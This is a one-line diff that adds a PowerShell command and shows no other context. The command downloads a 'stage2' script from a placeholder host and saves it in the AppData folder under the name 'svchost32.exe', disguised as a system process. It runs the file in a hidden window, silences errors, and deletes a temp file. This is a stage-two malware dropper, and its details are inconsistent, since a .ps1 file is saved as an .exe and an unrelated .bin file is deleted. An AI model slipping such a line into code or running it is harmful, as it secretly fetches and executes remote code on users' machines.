@@ -1,0 +1,1 @@
+$Stage2Url = "http://contoso.com:8080/stage2.ps1"; $LocalPath = "$env:APPDATA\svchost32.exe"; Start-BitsTransfer -Source $Stage2Url -Destination $LocalPath -ErrorAction SilentlyContinue; Start-Process -FilePath $LocalPath -WindowStyle Hidden -ErrorAction SilentlyContinue; Remove-Item -Path "$env:TEMP\stage2.bin" -Force
